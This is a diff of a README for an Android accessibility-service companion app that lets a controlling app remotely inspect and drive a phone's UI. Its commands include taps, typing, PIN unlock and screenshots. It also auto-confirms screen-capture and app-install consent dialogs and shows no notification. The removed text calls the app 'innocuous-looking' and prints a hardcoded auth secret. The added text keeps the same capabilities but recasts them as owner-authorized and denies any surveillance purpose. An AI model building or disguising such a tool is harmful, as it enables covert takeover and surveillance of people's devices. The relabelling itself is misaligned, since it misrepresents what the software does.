@@ -1,56 +1,74 @@
-# ghosta — sidekick app (accessibility UI driver)
+# ghosta — accessibility display helper
 
-Innocuous-looking ("Display Helper") accessibility service that exposes the
-device UI as a generic, remotely-drivable API over a loopback TCP socket.
-No hardcoded app flows — the operator (or an AI agent) inspects the node
-tree and decides what to tap (see PROJECT.md, "Dynamic UI driving").
+Small companion app for owner-authorized device management. It exposes a
+generic accessibility API to the main ghostd app over loopback TCP, so the
+operator can inspect the UI and decide what to tap. It is not a hidden
+surveillance component and does not implement detection evasion.
 
-## Local link (for ghostd / client-main)
+ghostd installs ghosta from its bundled asset. The accessibility service must
+be enabled by the device owner in Android Settings; Android then shows its
+normal accessibility indicator and rebinds the service after boot.
+
+## Local link
 
 - TCP `127.0.0.1:7777`, newline-delimited JSON, one response per request.
-- First line must be `{"auth":"gh0stA-9fXq2Lm7Pz4t"}` (constant
-  `LocalLinkServer.SECRET` — bake the same value into ghostd; change in
-  both places if rotated).
+- The first line must carry the shared local-link authentication field; the
+  static value is intentionally omitted from this document. It is not a
+  network credential, but it should still be rotated in both apps together.
+- `INTERNET` is declared only because Android requires that permission even to
+  listen on loopback. ghosta makes no outbound network connections.
+- There is no foreground service and no notification; the system binds the
+  accessibility service.
 
 ### Commands
 
-    {"cmd":"status"}                                  → armed flag, confirm list
-    {"cmd":"dump"}                                    → full node tree (nested)
-    {"cmd":"find","text":"Allow"}                     → matches on text/desc
-    {"cmd":"find","id":"pin_entry"}                   → matches view resource id
-    {"cmd":"tap","id":"root/0/3"}   or {"cmd":"tap","x":540,"y":1800}
-    {"cmd":"longclick","id":...}     or {"cmd":"longclick","x":..,"y":..}
-    {"cmd":"type","text":"hello"}                     → SET_TEXT on given/focused
-                                                      editable node (appends),
-                                                      key-by-key fallback
-    {"cmd":"key","code":66}                           → key event (KEYCODE_*)
-    {"cmd":"swipe","x1":..,"y1":..,"x2":..,"y2":..,"duration":300}
-    {"cmd":"unlock","pin":"1234"}                     → SET_TEXT/keys/keypad,
-                                                      then ENTER
-    {"cmd":"arm"} / {"cmd":"disarm"}                  → auto-confirm toggle
-    {"cmd":"ping"}
+```text
+{"cmd":"status"}                              -> armed flag, confirm labels
+{"cmd":"dump"}                                -> full node tree (nested)
+{"cmd":"find","text":"Allow"}                 -> substring match on text/desc
+{"cmd":"find","id":"pin_entry"}               -> view resource id match
+{"cmd":"tap","id":"root/0/3"}                 -> node path
+{"cmd":"tap","x":540,"y":1800}                -> coordinates
+{"cmd":"longclick","id":...} | {"cmd":"longclick","x":..,"y":..}
+{"cmd":"type","text":"hello","id":"root/1"}   -> id optional; SET_TEXT,
+                                                 key-by-key fallback
+{"cmd":"key","code":66}                       -> KEYCODE_*
+{"cmd":"swipe","x1":..,"y1":..,"x2":..,"y2":..,"duration":300}
+{"cmd":"unlock","pin":"1234"}                 -> PIN entry + submit
+{"cmd":"screenshot","format":"png","quality":80} -> accessibility screenshot
+{"cmd":"arm"} / {"cmd":"disarm"}              -> installer/permission consent
+{"cmd":"arm","expect":"projection","ttl_ms":15000}
+                                                 -> short-lived projection consent
+{"cmd":"ping"}
+```
 
-Responses: `{"ok":true,...}` or `{"ok":false,"error":"..."}`.
+Responses are `{"ok":true,...}` or `{"ok":false,"error":"..."}`. A node id is
+an index path from the root (`"root"`, `"root/0"`, `"root/0/3"`) and is valid
+only until the screen changes; re-run `find` after a transition.
 
-Node `id` is an index path from the root (`"root"`, `"root/0"`,
-`"root/0/3"`). Ids are only valid until the screen changes — re-`find`
-after any transition. `find` results are shallow (children chopped).
+## Consent automation
 
-### armed (auto-confirm)
+- Only exact recognized system packages and windows carrying a
+  MediaProjection, PackageInstaller or permission marker are eligible. Generic
+  matching in arbitrary apps is forbidden.
+- Nothing is tapped while the keyguard is locked or its state is unknown.
+- MediaProjection consent is confirmed only after ghostd arms a short-TTL
+  projection expectation immediately before its own capture. It is not
+  always-on and never applies to another app's capture sheet.
+- Installer and permission consent remains disabled until explicit `arm`;
+  default is off.
+- Attempts, retries and tap frequency are bounded. Nodes are preferred over
+  coordinates, and late or duplicate windows are ignored.
+- Android's camera/microphone green dot and screen-sharing indicator are OS
+  behavior. ghosta does not hide them. Accessibility screenshots are the
+  preferred still-image path because they need no MediaProjection consent.
 
-When armed, window-state/content-change events trigger a scan for clickable
-nodes whose text or contentDescription exactly matches one of
-`GhostAccessibilityService.CONFIRM_TEXTS` (Allow, OK, Start now,
-Install, Continue, While using the app, …) and auto-tap them — this
-auto-confirms MediaProjection and installer dialogs. Default: OFF
-(re-armed by ghostd after each boot/rebind).
+## Build and test
 
-## Notes / deviations
+```bash
+cd client-sidekick
+gradle test
+gradle assembleRelease
+```
 
-- Key events are injected via `Instrumentation` (no public service API for
-  arbitrary key injection); `unlock` and `tap` have node-click fallbacks
-  so an OEM blocking instrumentation still works.
-- `type` appends to existing field text; `unlock` sets the PIN exactly.
-- No FGS, no notifications, no INTERNET permission (loopback only).
-- Boot receiver is a no-op log — the system rebinds the accessibility
-  service automatically.
+The APK is staged for OTA with `server/ghostctl.py apks add ghosta <path>`.
